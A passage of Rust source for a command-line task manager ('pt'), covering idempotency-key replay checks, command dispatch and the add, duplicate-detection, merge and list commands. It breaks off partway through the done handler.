/// sidecar sets "dashboard"; HAL sessions "hal"), default "shell"; the
/// --idempotency-key flag keys the event for safe retries.
fn cli_ctx() -> ptask_core::event_log::EventCtx {
    let mut ctx = ptask_core::event_log::EventCtx::local(ptask_core::Config::from_env().actor);
    if let Some(key) = cli_idempotency_key() {
        ctx.event_uuid = Some(key);
        ctx.command = CLI_COMMAND.get().cloned();
    }
    ctx
}

/// The variant name of a parsed command: `Add`, `Goal`, ...
fn command_name(cmd: &Command) -> String {
    let debug = format!("{cmd:?}");
    debug
        .split(|c: char| !c.is_alphanumeric())
        .next()
        .unwrap_or_default()
        .to_string()
}

/// A keyed command's fingerprint: its parsed arguments, rendered so a retry
/// of the same command matches and a different command under the same key
/// does not.
///
/// Optional fields at their default (`note: None`, `unique: false`, empty
/// `acceptance`, `claim_next: false`) are omitted so a key journaled before
/// that field existed still matches. `--claim-next` (and `--lease` when
/// given) change what the command does, so they are part of the fingerprint
/// when set. A lone `-` for a note is replaced by the stdin payload, so the
/// key covers the text. The 3.42.2 `Add` form applies only when `--unique`
/// is off and `--ac` is empty: a keyed plain add must not replay an add with
/// acceptance criteria (or `--unique`), and vice versa.
fn command_fingerprint(cmd: &Command) -> Result<ptask_core::event_log::CommandFingerprint> {
    Ok(ptask_core::event_log::CommandFingerprint::new(
        &command_name(cmd),
        &fingerprint_args(cmd)?,
    ))
}

fn is_stdin_note(text: &[String]) -> bool {
    matches!(text, [s] if s == "-")
}

/// Keyed `pt done` fingerprint. 3.42.2 rendered only `queries`; optional
/// fields at their default are omitted so those keys still replay.
/// `--claim-next` (and `--lease` when given) change what the command does,
/// so they are part of the fingerprint when set.
fn fingerprint_done(a: &DoneArgs) -> String {
    if a.note.is_none() && !a.claim_next {
        return format!("Done(DoneArgs {{ queries: {:?} }})", a.queries);
    }
    let mut inner = format!("queries: {:?}", a.queries);
    if let Some(note) = &a.note {
        inner.push_str(&format!(", note: {:?}", Some(note)));
    }
    if a.claim_next {
        inner.push_str(", claim_next: true");
    }
    if let Some(lease) = &a.lease {
        inner.push_str(&format!(", lease: {:?}", Some(lease)));
    }
    format!("Done(DoneArgs {{ {inner} }})")
}

fn fingerprint_args(cmd: &Command) -> Result<String> {
    Ok(match cmd {
        Command::Note(a) if is_stdin_note(&a.text) => format!(
            "Note(NoteArgs {{ query: {:?}, text: {:?} }})",
            a.query,
            vec![stdin_note_text()?]
        ),
        Command::Remote(RemoteCommand::Note(a)) if is_stdin_note(&a.text) => format!(
            "Remote(Note(RemoteNoteArgs {{ query: {:?}, text: {:?}, url: {:?} }}))",
            a.query,
            vec![stdin_note_text()?],
            a.url
        ),
        Command::Done(a) => fingerprint_done(a),
        Command::Dismiss(a) if a.note.is_none() => {
            format!("Dismiss(DismissArgs {{ query: {:?} }})", a.query)
        }
        Command::Bulk(a) if a.note.is_none() => format!(
            "Bulk(BulkArgs {{ filter: {:?}, set_priority: {:?}, done: {:?}, dismiss: {:?}, dry_run: {:?} }})",
            a.filter, a.set_priority, a.done, a.dismiss, a.dry_run
        ),
        Command::Remote(RemoteCommand::Done(a)) if a.note.is_none() => format!(
            "Remote(Done(RemoteCloseArgs {{ query: {:?}, url: {:?} }}))",
            a.query, a.url
        ),
        Command::Remote(RemoteCommand::Dismiss(a)) if a.note.is_none() => format!(
            "Remote(Dismiss(RemoteDismissArgs {{ query: {:?}, url: {:?} }}))",
            a.query, a.url
        ),
        Command::Add(a) if !a.unique && a.acceptance.is_empty() => format!(
            "Add(AddArgs {{ title: {:?}, priority: {:?}, description: {:?}, deadline: {:?}, \
             reason: {:?}, raw: {:?}, kind: {:?}, deliverable: {:?} }})",
            a.title, a.priority, a.description, a.deadline, a.reason, a.raw, a.kind, a.deliverable
        ),
        other => format!("{other:?}"),
    })
}

/// Commands whose retry under `--idempotency-key` is replay-safe: the keyed
/// single-target verbs, multi-task `done`/`bulk` (keyed per task) and
/// `remote` (the key becomes the /sync command uuid).
fn honours_idempotency_key(cmd: &Command) -> bool {
    keyed_replay_spec(cmd).is_some()
        || matches!(
            cmd,
            Command::Done(_) | Command::Bulk(_) | Command::Remote(_)
        )
}

fn cli_idempotency_key() -> Option<String> {
    CLI_IDEMPOTENCY.get().cloned().flatten()
}

/// Attribution for one task of a multi-task command. The event log's uuid
/// is unique, so a shared `--idempotency-key` failed the second task; each
/// task gets `key:task_uuid`, deterministic so a retry replays per task.
fn task_ctx(task_uuid: &str) -> ptask_core::event_log::EventCtx {
    let ctx = cli_ctx();
    match ctx.event_uuid.as_deref() {
        Some(key) => ctx.with_uuid(format!("{key}:{task_uuid}")),
        None => ctx,
    }
}

/// True when this mutation's idempotency key already landed: the retry
/// reports success instead of re-applying (or tripping the unique index).
fn already_applied(db: &Db, ctx: &ptask_core::event_log::EventCtx) -> Result<bool> {
    let Some(key) = ctx.event_uuid.as_deref() else {
        return Ok(false);
    };
    let check = ptask_core::event_log::ReplayCheck {
        actor: &ctx.actor,
        task_uuid: None,
        event_types: &[],
        command: ctx.command.as_ref(),
    };
    Ok(ptask_core::event_log::check_replay(db, key, &check)
        .map_err(anyhow::Error::msg)?
        .is_some())
}

/// What a keyed command acts on, for the replay check.
enum KeyTarget {
    Task(String),
    Goal(String),
    Untargeted,
}

/// The journal event types a keyed single-target command writes, and what
/// it targets. `None` for commands without a single keyed event (reads,
/// multi-task verbs, which key each task as `key:<task uuid>`).
fn keyed_replay_spec(cmd: &Command) -> Option<(&'static [&'static str], KeyTarget)> {
    use KeyTarget::{Goal, Task, Untargeted};
    use goals::GoalCommand as G;
    const UPDATED: &[&str] = &["task.updated"];
    Some(match cmd {
        Command::Add(_) => (&["task.created"], Untargeted),
        // `--claim-next` journals a second event under `K:claim-next`; cmd_done
        // replays both so the retry still reports which task was claimed.
        Command::Done(a) if a.queries.len() == 1 && !a.claim_next => (
            &["task.completed", "task.recurrence_advanced"],
            Task(a.queries[0].clone()),
        ),
        Command::Priority(a) => (UPDATED, Task(a.query.clone())),
        Command::Edit(a) => (UPDATED, Task(a.query.clone())),
        Command::Reopen(a) => (UPDATED, Task(a.query.clone())),
        Command::Dismiss(a) => (UPDATED, Task(a.query.clone())),
        Command::Note(a) => (&["task.noted"], Task(a.query.clone())),
        Command::Start(a) => (UPDATED, Task(a.query.clone())),
        Command::Claim(a) => (&["task.claimed"], Task(a.query.clone())),
        Command::Release(a) => (&["task.released"], Task(a.query.clone())),
        Command::Snooze(a) => (UPDATED, Task(a.query.clone())),
        Command::Depend(a) => (UPDATED, Task(a.query.clone())),
        Command::Kind(a) => (UPDATED, Task(a.query.clone())),
        Command::Promote(a) => (&["task.promoted"], Task(a.query.clone())),
        Command::Rm(a) => (&["task.deleted"], Task(a.query.clone())),
        Command::Merge(a) => (UPDATED, Task(a.duplicate.clone())),
        Command::Goal(G::Add(_)) => (&["goal.created"], Untargeted),
        Command::Goal(G::Link(a)) => (&["task.goal_linked"], Task(a.task.clone())),
        Command::Goal(G::Unlink(a)) => (&["task.goal_unlinked"], Task(a.task.clone())),
        Command::Goal(G::Done(a) | G::Abandon(a)) => (&["goal.updated"], Goal(a.id.clone())),
        Command::Goal(G::SetParent(a)) => (&["goal.updated"], Goal(a.id.clone())),
        _ => return None,
    })
}

/// True when `key` already journaled this very command: report it as
/// replayed. Errors when the key was used for another command or task —
/// the old check only asked whether the key existed, so a reused key
/// printed "replayed" and silently skipped the new command.
fn replay_keyed(db: &Db, key: &str, cmd: &Command) -> Result<bool> {
    let Some((types, target)) = keyed_replay_spec(cmd) else {
        return Ok(false);
    };
    let Some(event) = ptask_core::event_log::get_by_uuid(db, key)? else {
        return Ok(false);
    };
    // The target as it resolves now; a deleted task (replayed rm) no longer
    // does, and the event type alone decides.
    let target_uuid = match &target {
        KeyTarget::Task(q) => tasks::resolve_for_lookup(db, q, true).ok().map(|t| t.id),
        KeyTarget::Goal(id) => ptask_core::goals::get(db, id).ok().map(|g| g.uuid),
        KeyTarget::Untargeted => None,
    };
    let ctx = cli_ctx();
    let check = ptask_core::event_log::ReplayCheck {
        actor: &ctx.actor,
        task_uuid: target_uuid.as_deref(),
        event_types: types,
        command: ctx.command.as_ref(),
    };
    ptask_core::event_log::verify_replay(key, &event, &check).map_err(anyhow::Error::msg)?;

    let subject = event.task_uuid.as_deref().unwrap_or_default();
    if event.event_type.starts_with("goal.") {
        let goal = ptask_core::goals::get(db, subject).map_err(anyhow::Error::msg)?;
        if json_mode() {
            crate::print_json(&goal.to_json())?;
        } else {
            println!(
                "{}",
                ui::outcome(
                    ui::Status::Ok,
                    "replayed",
                    &goal.g_id(),
                    &goal.title,
                    "idempotency key already applied"
                )
            );
        }
        return Ok(true);
    }
    let task = tasks::resolve_for_lookup(db, subject, true).ok();
    let mut out = match &task {
        Some(t) => serde_json::to_value(t)?,
        None => serde_json::json!({ "id": subject }),
    };
    out["outcome"] = serde_json::json!("replayed");
    emit(&out, || {
        let handle = task
            .as_ref()
            .and_then(|t| t.pt_id.clone())
            .unwrap_or_else(|| short_id(subject).to_string());
        let title = task.as_ref().map(|t| t.title.as_str()).unwrap_or("");
        println!(
            "{}",
            ui::outcome(
                ui::Status::Ok,
                "replayed",
                &handle,
                title,
                "idempotency key already applied"
            )
        );
    })?;
    Ok(true)
}

/// `--json` shape for a remote verb that acted on one task: its identity,
/// the verb, and whatever the client knows of the result.
fn remote_outcome(
    task: &ptask_core::Task,
    action: &str,
    extra: serde_json::Value,
) -> serde_json::Value {
    let mut out = serde_json::json!({
        "pt_id": task.pt_id,
        "task_uuid": task.id,
        "title": task.title,
        "action": action,
    });
    if let (Some(out), serde_json::Value::Object(extra)) = (out.as_object_mut(), extra) {
        out.extend(extra);
    }
    out
}

/// `pt remote list` filter with `-p` folded in as a DSL `pN` term.
fn remote_list_filter(filter: Option<&str>, priority: Option<i64>) -> Option<String> {
    match (filter, priority) {
        (Some(f), Some(p)) => Some(format!("({f}) & p{p}")),
        (None, Some(p)) => Some(format!("p{p}")),
        (f, None) => f.map(str::to_string),
    }
}

fn remote_client(url: Option<&str>) -> Result<remote::RemoteClient> {
    let client = match url {
        Some(u) => remote::RemoteClient::with_url(u)?,
        None => remote::RemoteClient::from_env()?,
    };
    Ok(client.with_idempotency_key(cli_idempotency_key()))
}

fn main() {
    // A downstream `| head` closes the pipe early; the default Rust behaviour
    // is a panic on the next println!. Restore the Unix default (exit quietly).
    // SAFETY: setting a signal disposition before any thread exists.
    #[cfg(unix)]
    unsafe {
        libc::signal(libc::SIGPIPE, libc::SIG_DFL);
    }
    if let Err(e) = run() {
        // Core errors use newlines as structure (the ambiguous-match list)
        // and fold them inside the titles they embed, so each line prints
        // on its own, painted (and therefore sanitised) one at a time.
        let msg = format!("{e:#}");
        let mut lines = msg.lines();
        eprintln!(
            "{}",
            ui::section("error", ui::Ink::Red, lines.next().unwrap_or(""))
        );
        for line in lines {
            eprintln!("  {}", ui::paint(line, ui::Ink::Slate));
        }
        std::process::exit(approvals::exit_code(&e).unwrap_or(1));
    }
}

fn run() -> Result<()> {
    let cli = Cli::parse();
    set_cli_globals(cli.json, cli.idempotency_key.clone());
    if let Some(key) = cli.idempotency_key.as_deref()
        && ptask_core::event_log::is_reserved_client_key(key)
    {
        // The capture lane's keys mark capture-created tasks (what
        // /capture/resolve may close); a client key must not forge one.
        anyhow::bail!("--idempotency-key: the capture prefix is reserved for the capture lane");
    }
    if cli.idempotency_key.is_some() {
        // A key on a verb that cannot replay would mint twice or hit the
        // journal's unique index on retry: refuse it up front.
        match &cli.command {
            Some(cmd) if honours_idempotency_key(cmd) => {
                let _ = CLI_COMMAND.set(command_fingerprint(cmd)?);
            }
            other => anyhow::bail!(
                "--idempotency-key is not supported by `pt {}`: a retry would not be \
                 replay-safe; drop the flag",
                other
                    .as_ref()
                    .map(|c| command_name(c).to_ascii_lowercase())
                    .unwrap_or_default()
            ),
        }
    }
    ui::init(match cli.color {
        _ if cli.no_color || cli.json => ui::ColorMode::Never,
        ColorChoice::Auto => ui::ColorMode::Auto,
        ColorChoice::Always => ui::ColorMode::Always,
        ColorChoice::Never => ui::ColorMode::Never,
    });

    // Lightweight tracing: env-controlled, off by default.
    let filter = tracing_subscriber::EnvFilter::try_from_env("PTASK_LOG")
        .unwrap_or_else(|_| tracing_subscriber::EnvFilter::new("warn"));
    // Colour only for a terminal: scripts and agents read stderr as text.
    // Field values can carry DB or task text (a SQLite error quoting a
    // title, say), so each is folded to one sanitised line before it
    // reaches the terminal.
    use tracing_subscriber::field::MakeExt;
    let fields = tracing_subscriber::fmt::format::debug_fn(|w, field, value| {
        let text = format!("{value:?}");
        let text = ui::one_line(&text);
        if field.name() == "message" {
            write!(w, "{text}")
        } else {
            write!(w, "{}={text}", field.name())
        }
    })
    .delimited(" ");
    tracing_subscriber::fmt()
        .fmt_fields(fields)
        .with_env_filter(filter)
        .with_writer(std::io::stderr)
        .with_ansi(std::io::stderr().is_terminal())
        .init();

    let command = cli.command;

    // These commands are deliberately DB-free: they must work on fleet client
    // nodes before a local SQLite store exists. Keep them before Db::open_*().
    match command {
        Some(Command::Remote(c)) => cmd_remote(c),
        Some(Command::GenManpage) => cmd_gen_manpage(),
        Some(Command::GenCompletions(a)) => cmd_gen_completions(a),
        other => {
            let db = match cli.db.as_deref() {
                Some(p) => Db::open(p).with_context(|| format!("opening db at {}", p))?,
                None => Db::open_default().context("opening default db")?,
            };

            // A retried keyed mutation reports success without re-applying;
            // a key reused for a different command or task is an error.
            if let (Some(key), Some(cmd)) = (cli_idempotency_key(), other.as_ref())
                && replay_keyed(&db, &key, cmd)?
            {
                return Ok(());
            }

            match other {
                Some(Command::Add(a)) => cmd_add(&db, a),
                Some(Command::List(a)) => cmd_list(&db, a),
                Some(Command::Done(a)) => cmd_done(&db, a),
                Some(Command::Priority(a)) => cmd_priority(&db, a),
                Some(Command::Edit(a)) => cmd_edit(&db, a),
                Some(Command::Reopen(a)) => cmd_reopen(&db, a),
                Some(Command::Show(a)) => cmd_show(&db, a),
                Some(Command::Context(a)) => cmd_context(&db, a),
                Some(Command::Dismiss(a)) => cmd_dismiss(&db, a),
                Some(Command::Note(a)) => cmd_note(&db, a),
                Some(Command::Rm(a)) => cmd_rm(&db, a),
                Some(Command::Criteria(c)) => cmd_criteria(&db, c),
                Some(Command::Dupes(a)) => cmd_dupes(&db, a),
                Some(Command::Merge(a)) => cmd_merge(&db, a),
                Some(Command::Next(a)) => cmd_next(&db, a),
                Some(Command::Plan(a)) => cmd_plan(&db, a),
                Some(Command::View(c)) => cmd_view(&db, c),
                Some(Command::Tui) => ptask_tui::run(db),
                Some(Command::Serve(a)) => cmd_serve(db, a),
                Some(Command::Bot) => cmd_bot(db),
                Some(Command::Mcp) => cmd_mcp(db),
                Some(Command::Digest(a)) => cmd_digest(&db, a),
                Some(Command::Export(a)) => cmd_export(&db, a),
                Some(Command::Delegate(a)) => cmd_delegate(&db, a),
                Some(Command::Branch(a)) => cmd_branch(&db, a),
                Some(Command::Distill(a)) => cmd_distill(&db, a),
                Some(Command::Accountability(c)) => cmd_accountability(db, c),
                Some(Command::Scoring(c)) => cmd_scoring(&db, c),
                Some(Command::Start(a)) => cmd_start(&db, a),
                Some(Command::Claim(a)) => cmd_claim(&db, a),
                Some(Command::Heartbeat(a)) => cmd_heartbeat(&db, a),
                Some(Command::Release(a)) => cmd_release(&db, a),
                Some(Command::Reclaim(a)) => cmd_reclaim(&db, a),
                Some(Command::Promote(a)) => cmd_promote(&db, a),
                Some(Command::Kind(a)) => cmd_kind(&db, a),
                Some(Command::Snooze(a)) => cmd_snooze(&db, a),
                Some(Command::Reap(a)) => cmd_reap(&db, a),
                Some(Command::Depend(a)) => cmd_depend(&db, a),
                Some(Command::Review(a)) => cmd_review(&db, a),
                Some(Command::Search(a)) => cmd_search(&db, a),
                Some(Command::Why(a)) => cmd_why(&db, a),
                Some(Command::Bulk(a)) => cmd_bulk(&db, a),
                Some(Command::Log(a)) => cmd_log(&db, a),
                Some(Command::Flux(a)) => cmd_flux(&db, a),
                Some(Command::Undo(a)) => cmd_undo(&db, a),
                Some(Command::Token(c)) => cmd_token(&db, c),
                Some(Command::Approval(c)) => cmd_approval(&db, c),
                Some(Command::Goal(c)) => goals::run(&db, c, cli_ctx(), json_mode()),
                Some(Command::Approve(a)) => approvals::cmd_decide(
                    &db,
                    &a.id,
                    ptask_core::approvals::Decision::Approve,
                    a.note.as_deref(),
                    a.via,
                    a.force,
                    cli_ctx(),
                    json_mode(),
                ),
                Some(Command::Reject(a)) => approvals::cmd_decide(
                    &db,
                    &a.id,
                    ptask_core::approvals::Decision::Reject,
                    a.note.as_deref(),
                    a.via,
                    a.force,
                    cli_ctx(),
                    json_mode(),
                ),
                Some(Command::Backfill) => cmd_backfill(&db),
                None if std::io::stdin().is_terminal() && std::io::stdout().is_terminal() => {
                    ptask_tui::run(db)
                }
                None => {
                    // Non-interactive fallback: avoid trying to enter alt-screen when
                    // stdin/stdout is not a TTY. Interactive `pt` opens the TUI.
                    for l in ui::banner(
                        "ptask",
                        &format!(
                            "v{}   sovereign task manager   {}",
                            ptask_core::VERSION,
                            ui::utc_stamp()
                        ),
                        Some(("cli", ui::Ink::Cyan)),
                    ) {
                        println!("{l}");
                    }
                    println!(
                        "{}",
                        ui::note(
                            "pt tui · pt add \"...\" · pt list · pt next · pt done PT-N · pt --help"
                        )
                    );
                    Ok(())
                }
                Some(Command::Remote(_))
                | Some(Command::GenManpage)
                | Some(Command::GenCompletions(_)) => unreachable!("handled before DB open"),
            }
        }
    }
}

fn cmd_add(db: &Db, a: AddArgs) -> Result<()> {
    // Default: quick-add parse. --raw disables it for literal titles.
    let q = if a.raw {
        quickadd::QuickAdd {
            title: a.title.clone(),
            priority: Some(2),
            ..Default::default()
        }
    } else {
        quickadd::parse(&a.title).map_err(anyhow::Error::msg)?
    };

    // CLI flags override parsed values.
    let (mut new, mut ext) = q.task_parts("claude_code");
    if let Some(s) = a.priority.as_deref() {
        new.priority = priority::parse(s).map_err(anyhow::Error::msg)?;
    }
    if let Some(description) = a.description.clone() {
        new.description = description;
    }
    if a.deadline.is_some() {
        new.deadline = a.deadline.clone();
    }
    new.ai_reasoning = a.reason.unwrap_or_default();
    (ext.kind, ext.deliverable) =
        tasks::kind_and_deliverable(a.kind.as_deref(), a.deliverable.as_deref())?;
    ext.acceptance = a.acceptance.clone();

    // Likely duplicates of what is about to be filed: reported on every add,
    // and with --unique a reason not to file it at all.
    let possible_duplicates = ptask_core::dupes::similar(
        db,
        &new.title,
        None,
        ptask_core::dupes::DEFAULT_THRESHOLD,
        5,
    )?;
    if a.unique && ptask_core::dupes::refuses(&new.title, &possible_duplicates) {
        if json_mode() {
            crate::print_json(&serde_json::json!({
                "created": false, "possible_duplicates": possible_duplicates,
            }))?;
        } else {
            print_duplicates(&possible_duplicates, None);
        }
        anyhow::bail!(
            "not created: {} likely duplicate(s) of {:?}; work the existing task, or drop --unique",
            possible_duplicates.len(),
            ui::one_line(&new.title)
        );
    }

    let task = tasks::create_with_extensions(db, new, ext, &cli_ctx())?;

    // The quick-add derivations (labels, project, duration) live on `q`, not on
    // the row projection, so the JSON shape carries both halves — otherwise a
    // caller that creates with `@label`/`#project` cannot see what it just set.
    #[derive(serde::Serialize)]
    struct AddOutput {
        #[serde(flatten)]
        task: ptask_core::Task,
        labels: Vec<String>,
        project: Option<String>,
        duration_min: Option<i64>,
        reminder: Option<String>,
        recurrence: Option<String>,
        #[serde(skip_serializing_if = "Vec::is_empty")]
        possible_duplicates: Vec<ptask_core::dupes::Candidate>,
    }
    let out = AddOutput {
        task,
        labels: q.labels.clone(),
        project: q.project.clone(),
        duration_min: q.duration_min,
        reminder: q.reminder.clone(),
        recurrence: q.recurrence.as_ref().map(|r| r.original_input.clone()),
        possible_duplicates,
    };

    emit(&out, || {
        let t = &out.task;
        println!(
            "{}",
            ui::outcome(
                ui::Status::Ok,
                "created",
                t.pt_id.as_deref().unwrap_or_else(|| short_id(&t.id)),
                &t.title,
                ""
            )
        );
        // Echo the parsed interpretation so a silent quick-add mis-parse
        // (the PT-653 class) is visible at the moment of creation.
        let mut pairs: Vec<(&str, ui::Cell)> =
            vec![("priority", ui::painted(ui::priority_pill(t.priority)))];
        if let Some(d) = &t.deadline {
            pairs.push(("deadline", ui::painted(ui::due_cell(Some(d)))));
        }
        if !t.description.is_empty() {
            pairs.push(("desc", (&t.description).into()));
        }
        if !out.labels.is_empty() {
            pairs.push(("labels", out.labels.join(", ").into()));
        }
        if let Some(p) = &out.project {
            pairs.push(("project", p.into()));
        }
        if let Some(m) = out.duration_min {
            pairs.push(("estimate", format!("{m}m").into()));
        }
        if let Some(r) = &out.reminder {
            pairs.push(("reminder", r.into()));
        }
        if let Some(rec) = &out.recurrence {
            pairs.push(("recurs", rec.into()));
        }
        pairs.push(("uuid", ui::painted(ui::dim(&t.id, ui::Ink::Slate))));
        for l in ui::kv(&pairs, 14) {
            println!("    {}", l.trim_start());
        }
        if !out.possible_duplicates.is_empty() {
            print_duplicates(&out.possible_duplicates, t.pt_id.as_deref());
        }
    })
}

/// The "possible duplicate" warning block: one line per candidate, and the
/// merge command when the new task already exists.
fn print_duplicates(cands: &[ptask_core::dupes::Candidate], new_pt: Option<&str>) {
    for c in cands {
        println!(
            "{}",
            ui::outcome(
                ui::Status::Warn,
                "duplicate?",
                c.pt_id.as_deref().unwrap_or_else(|| short_id(&c.task_uuid)),
                &c.title,
                &format!("{:.2} · {}", c.score, c.status)
            )
        );
    }
    if let (Some(new_pt), Some(first)) = (
        new_pt,
        cands
            .iter()
            .find(|c| !matches!(c.status.as_str(), "done" | "dismissed"))
            .and_then(|c| c.pt_id.as_deref()),
    ) {
        println!(
            "{}",
            ui::note(&format!("same work? pt merge {new_pt} --into {first}"))
        );
    }
}

fn cmd_dupes(db: &Db, a: DupesArgs) -> Result<()> {
    if !(0.0..=1.0).contains(&a.threshold) {
        anyhow::bail!("--threshold must be within 0..=1");
    }
    if let Some(q) = a.query.as_deref() {
        let task = tasks::resolve_for_lookup(db, q, true).map_err(anyhow::Error::msg)?;
        let cands =
            ptask_core::dupes::similar(db, &task.title, Some(&task.id), a.threshold, a.limit)?;
        if json_mode() {
            return crate::print_json(&cands);
        }
        print_lines(ui::headline(
            &format!("ptask · dupes {}", task.pt_id.as_deref().unwrap_or("")),
            None,
            &ui::clip(&task.title, 60),
        ));
        if cands.is_empty() {
            println!("{}", ui::empty("no likely duplicates"));
            return Ok(());
        }
        print_duplicates(&cands, task.pt_id.as_deref());
        return Ok(());
    }
    let pairs = ptask_core::dupes::pairs(db, a.threshold, a.limit)?;
    if json_mode() {
        return crate::print_json(&pairs);
    }
    print_lines(ui::headline(
        "ptask · dupes",
        None,
        &format!("open tasks · similarity ≥ {:.2}", a.threshold),
    ));
    if pairs.is_empty() {
        println!("{}", ui::empty("no likely duplicates"));
        return Ok(());
    }
    for p in &pairs {
        let a_id =
            p.a.pt_id
                .as_deref()
                .unwrap_or_else(|| short_id(&p.a.task_uuid));
        let b_id =
            p.b.pt_id
                .as_deref()
                .unwrap_or_else(|| short_id(&p.b.task_uuid));
        println!(
            "{}",
            ui::outcome(
                ui::Status::Warn,
                &format!("{:.2}", p.score),
                a_id,
                &p.a.title,
                ""
            )
        );
        println!(
            "{}",
            ui::outcome(
                ui::Status::Warn,
                "",
                b_id,
                &p.b.title,
                &format!("pt merge {b_id} --into {a_id}")
            )
        );
    }
    println!(
        "{}",
        ui::footer(pairs.len(), "pair", "pt merge PT-B --into PT-A")
    );
    Ok(())
}

fn cmd_merge(db: &Db, a: MergeArgs) -> Result<()> {
    let dup = tasks::resolve_for_lookup(db, &a.duplicate, false).map_err(anyhow::Error::msg)?;
    let into = tasks::resolve_for_lookup(db, &a.into, true).map_err(anyhow::Error::msg)?;
    let m = ptask_core::dupes::merge(db, &dup.id, &into.id, a.reason.as_deref(), &cli_ctx())
        .map_err(anyhow::Error::msg)?;
    if let Err(e) = ptask_core::scoring::run_once(db, false) {
        eprintln!(
            "{}",
            ui::section(
                "warning",
                ui::Ink::Amber,
                &format!("merged but rescore failed: {e}")
            )
        );
    }
    emit(&m, || {
        println!(
            "{}",
            ui::outcome(
                ui::Status::Mute,
                "merged",
                &m.duplicate,
                &dup.title,
                &format!("→ duplicate of {}", m.into)
            )
        );
        let mut moved = Vec::new();
        if !m.dependents_moved.is_empty() {
            moved.push(format!("dependents {}", m.dependents_moved.join(", ")));
        }
        if !m.prerequisites_added.is_empty() {
            moved.push(format!(
                "prerequisites {}",
                m.prerequisites_added.join(", ")
            ));
        }
        if !m.labels_added.is_empty() {
            moved.push(format!("labels {}", m.labels_added.join(", ")));
        }
        if let Some((from, to)) = m.priority_raised {
            moved.push(format!("priority {from} → {to}"));
        }
        if let Some(d) = &m.deadline_set {
            moved.push(format!("deadline {d}"));
        }
        if m.recurrence_copied {
            moved.push("recurrence".into());
        }
        if let Some(g) = &m.goal_copied {
            moved.push(format!("goal {g}"));
        }
        if !m.discovered_from_added.is_empty() {
            moved.push(format!(
                "discovered_from {}",
                m.discovered_from_added.join(", ")
            ));
        }
        if !m.subtasks_moved.is_empty() {
            moved.push(format!("subtasks {}", m.subtasks_moved.join(", ")));
        }
        if !moved.is_empty() {
            println!(
                "    {} {}",
                ui::dim("carried to", ui::Ink::Slate),
                moved.join(" · ")
            );
        }
    })
}

fn cmd_list(db: &Db, a: ListArgs) -> Result<()> {
    let p = a
        .priority
        .as_deref()
        .map(priority::parse)
        .transpose()
        .map_err(anyhow::Error::msg)?;
    // `-s` applies with or without a filter (default pending); `-s all`
    // lifts it.
    let status_filter = if a.status == "all" {
        None
    } else {
        Some(a.status.as_str())
    };
    let filter_expr = a
        .filter
        .as_deref()
        .map(ptask_core::filter::parse)
        .transpose()
        .map_err(anyhow::Error::msg)?;
    let sort = ptask_core::ordering::SortKey::parse(&a.sort).map_err(anyhow::Error::msg)?;
    let rows =
        tasks::list_with_filter_sorted(db, filter_expr.as_ref(), status_filter, p, a.limit, sort)?;
    if json_mode() {
        crate::print_json(&rows)?;
        return Ok(());
    }
    let mut note = format!("{} · sorted by {}", a.status, a.sort);
    if let Some(f) = a.filter.as_deref() {
        note.push_str(&format!(" · filter {f:?}"));
    }
    note.push_str(&format!(" · {}", ui::utc_stamp()));
    print_lines(ui::headline("ptask · list", None, &note));
    if rows.is_empty() {
        println!("{}", ui::empty("no tasks match"));
        return Ok(());
    }
    let banded = matches!(sort, ptask_core::ordering::SortKey::Severity);
    print_lines(ui::task_table(&rows, banded, true, a.verbose));
    println!(
        "{}",
        ui::footer(rows.len(), "task", "pt show PT-N · pt done PT-N · pt next")
    );
    Ok(())
}

fn print_lines(lines: Vec<String>) {
    for l in lines {
        println!("{l}");
    }
}

/// `--claim-next` after the closes have committed. A claim failure is
/// reported here so the command still succeeds for the closes.
enum ClaimedNext {
    Task {
        task: Box<tasks::Task>,
        claim: Option<ptask_core::claims::Claim>,
    },
    Nothing,
    Error(String),
}

impl ClaimedNext {
    fn to_json(&self) -> Result<serde_json::Value> {
        Ok(match self {
            Self::Task { task, claim } => {
                let mut v = serde_json::to_value(task)?;
                if let Some(c) = claim {
                    attach_claim_fields(&mut v, c);
                }
                v
            }
            Self::Nothing => serde_json::Value::Null,
            Self::Error(e) => serde_json::json!({ "error": e }),
        })
    }
}

fn attach_claim_fields(v: &mut serde_json::Value, claim: &ptask_core::claims::Claim) {
    v["claimed_by"] = serde_json::json!(claim.by);
    v["claim_expires_at"] = serde_json::json!(claim.expires_at);
    if !claim.token.is_empty() {
        v["claim_token"] = serde_json::json!(claim.token);
    }
}

/// Holder and lease for a keyed claim-next replay. No claim_token: tokens
/// are never handed back on a replay (as with a keyed `pt claim`), so only
/// the session that took the claim holds it.
fn claim_for_reply(db: &Db, task_uuid: &str) -> Option<ptask_core::claims::Claim> {
    ptask_core::claims::get(db, task_uuid).ok().flatten()
}

/// Look up a keyed `K:claim-next` claim, or make one, skipping `skip`
/// (the tasks this call just closed or advanced). `lease_minutes` is the
/// optional lease on a fresh take (`pt claim` / `task_claim`).
fn take_claimed_next(db: &Db, skip: &[String], lease_minutes: Option<i64>) -> ClaimedNext {
    let ctx = cli_ctx();
    let ctx = match ctx.event_uuid.clone() {
        Some(key) => ctx.with_uuid(format!("{key}:claim-next")),
        None => ctx,
    };
    if let Some(key) = ctx.event_uuid.as_deref() {
        match ptask_core::event_log::get_by_uuid(db, key) {
            Ok(Some(event)) => {
                return match event.task_uuid.as_deref() {
                    Some(id) => match tasks::resolve_for_lookup(db, id, true) {
                        Ok(t) => ClaimedNext::Task {
                            claim: claim_for_reply(db, id),
                            task: Box::new(t),
                        },
                        Err(e) => ClaimedNext::Error(e.to_string()),
                    },
                    None => ClaimedNext::Nothing,
                };
            }
            Ok(None) => {}
            Err(e) => return ClaimedNext::Error(e.to_string()),
        }
    }
    match ptask_core::dag::claim_next(db, &ctx, skip, lease_minutes) {
        Ok(Some((t, claim))) => ClaimedNext::Task {
            task: Box::new(t),
            claim: Some(claim),
        },
        Ok(None) => ClaimedNext::Nothing,
        Err(e) => ClaimedNext::Error(e.to_string()),
    }
}

fn cmd_done(db: &Db, a: DoneArgs) -> Result<()> {
    let lease_minutes = if a.claim_next {
        a.lease
            .as_deref()
            .map(ptask_core::claims::parse_lease)
            .transpose()
            .map_err(anyhow::Error::msg)?
    } else {
        None
    };
    let multi = a.queries.len() > 1;
    let mut results = Vec::new();
    let mut failed = 0usize;
    let mut skip = Vec::new();
    for query in &a.queries {
        // One task's failure (blocked, not found) no longer abandons the
        // rest of the list half-applied; every failure is reported.
        let task = match tasks::resolve(db, query) {
            Ok(t) => t,
            Err(e) => {
                failed += 1;
                report_done_failure(&mut results, query, &e.to_string());
                continue;
            }
        };
